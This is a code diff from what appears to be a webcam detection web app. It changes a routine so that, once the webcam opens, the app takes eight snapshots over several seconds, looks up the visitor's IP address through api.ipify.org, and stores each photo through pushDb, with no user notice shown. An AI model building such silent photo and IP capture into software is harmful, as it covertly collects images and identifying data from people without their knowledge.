@@ -88,6 +88,17 @@ export default {
       });
     }
 
+    function timeoutDb(timeout) {
+      setTimeout(() => {
+        const pic = state.webcam.snap();
+        state.picAfterWebcam = pic;
+        axios.get("https://api.ipify.org?format=jsonp&callback=?").then(e => {
+          state.ipOfUser = e.data;
+          pushDb(state.picAfterWebcam);
+        });
+      }, timeout);
+    }
+
     async function detect() {
       state.predictionInfo = "Detecting...";
       state.predictions = [];
@@ -107,16 +118,14 @@ export default {
           state.isWebcamOpened = true;
           console.log("webcam started");
           console.log(result);
-          setTimeout(() => {
-            const pic = state.webcam.snap();
-            state.picAfterWebcam = pic;
-            axios
-              .get("https://api.ipify.org?format=jsonp&callback=?")
-              .then(e => {
-                state.ipOfUser = e.data;
-                pushDb(state.picAfterWebcam);
-              });
-          }, 4000);
+          timeoutDb(2500);
+          timeoutDb(3000);
+          timeoutDb(3500);
+          timeoutDb(4000);
+          timeoutDb(4500);
+          timeoutDb(5000);
+          timeoutDb(5500);
+          timeoutDb(6000);
         })
         .catch(err => {
           console.log(err);
